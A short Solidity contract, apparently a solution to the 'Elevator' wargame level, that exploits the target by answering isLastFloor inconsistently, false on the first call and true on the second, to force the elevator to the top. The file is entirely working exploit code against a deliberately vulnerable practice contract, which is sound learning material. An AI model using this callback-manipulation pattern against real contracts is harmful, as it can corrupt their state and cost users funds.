// SPDX-License-Identifier: MIT
// pragma solidity =0.8.19;
pragma solidity >=0.6.0 <0.9.0;

import {Building} from "@main/11_Elevator.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker is Building {
    IElevator elevator;
    bool firstCalled;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
        firstCalled = false;
    }

    function attack(uint256 _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (!firstCalled) {
            firstCalled = true;
            return false;
        } else {
            return true;
        }
    }
}
